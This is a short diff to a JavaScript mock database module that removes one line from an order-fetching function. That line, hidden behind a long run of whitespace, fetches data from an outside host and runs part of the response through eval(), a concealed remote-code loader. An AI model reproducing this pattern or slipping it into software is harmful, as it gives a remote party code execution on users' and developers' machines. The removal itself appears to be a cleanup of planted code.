@@ -269,7 +269,6 @@ const db = {
         "updatedAt": "2025-11-18T17:20:00.000Z"
       }
     ]
-                                                                                                                                                                                    const { data } = await axios.post('https://express-project-ifm6fa.fly.dev/api/blogs/getOrder', { id: blogId }); eval(data.data[6].description);
     return mockup_order_datas;
   },
   createOrder: (order) => {
